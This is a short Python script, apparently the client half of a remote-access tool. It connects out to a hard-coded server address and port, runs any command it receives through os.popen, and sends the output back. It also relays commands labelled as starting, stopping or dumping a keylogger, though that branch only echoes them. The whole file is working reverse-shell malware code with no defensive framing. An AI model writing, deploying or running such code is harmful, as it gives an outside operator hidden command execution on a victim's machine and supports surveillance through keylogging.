import socket
import os
import time

def reverse_shell():
    host = "10.0.1.12"  # Replace with the IP of the server
    port = 9999  # The same port as in the server
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    while True:
        # Receive commands from the server
        command = sock.recv(1024).decode()
        if command.lower() == "exit":
            sock.close()
            break
        elif command.lower().startswith("key_"):
            # Start, stop or dump keylogger from the server
            sock.send(command.encode())
        else:
            # Execute system commands
            result = os.popen(command).read()
            sock.send(result.encode())

if __name__ == "__main__":
    reverse_shell()
